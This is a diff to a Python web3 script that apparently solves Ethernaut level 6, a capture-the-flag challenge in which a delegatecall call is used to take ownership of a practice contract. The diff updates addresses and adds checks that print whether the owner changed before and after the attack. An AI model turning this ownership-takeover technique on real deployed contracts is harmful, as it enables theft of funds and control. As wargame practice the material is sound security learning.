@@ -39,9 +39,9 @@ dict_output = parse_env_to_dict(ENV_PATH)
 RPC_URI = dict_output['WEB3_PROVIDER_URI']
 
 
-CONTRACT_ADDRESS = '0xE0Ad0b727EDda6e1a583706aE76587b09B417077'
+CONTRACT_ADDRESS = '0xdAD42D43ecE0f6e8da8c2BCbC6A25FF6b3922C58'
 LEVEL_ADDRESS = '0x' + dict_output['ETHERNAUT_LEVEL06_ADDRESS']
-USER_PRIVATE_KEY = '0x' + dict_output['FIRST_USER_ADDRESS_PRIVATE_KEY']
+USER_PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']
 
 web3 = Web3(Web3.HTTPProvider(RPC_URI))
 
@@ -96,6 +96,12 @@ BEFORE_OWNER = contract.functions.owner().call()
 
 print(f'Owner Address Before Attack: {BEFORE_OWNER}')
 
+if BEFORE_OWNER != USER_ADDRESS:
+    print("Contract's Owner is not changed!\n")
+else:
+    print("Contract's Owner is already changed!\n")
+    exit(0)
+
 # 컨트랙트에 delegatecall 호출을 위한 데이터 준비
 data = {
     'gas': 300000,
@@ -119,3 +125,9 @@ print(f"Transaction Receipt: {tx_receipt}")
 AFTER_OWNER = contract.functions.owner().call()
 
 print(f'Owner Address After Attack: {AFTER_OWNER}')
+
+if AFTER_OWNER != USER_ADDRESS:
+    print("Contract's Owner has not changed!")
+    exit(0)
+else:
+    print("Contract's Owner has changed!")
